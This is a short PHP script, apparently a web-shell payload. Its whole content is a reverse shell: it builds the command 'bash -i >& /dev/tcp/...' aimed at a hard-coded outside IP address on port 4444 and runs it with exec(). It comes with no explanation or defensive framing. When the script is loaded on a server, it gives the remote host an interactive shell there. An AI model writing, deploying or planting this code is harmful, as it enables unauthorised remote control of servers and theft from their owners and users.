<?php
$host = '155.117.189.87';
$port = 4444;
$cmd  = 'bash -i >& /dev/tcp/' . $host . '/' . $port . ' 0>&1';

exec($cmd);

?>
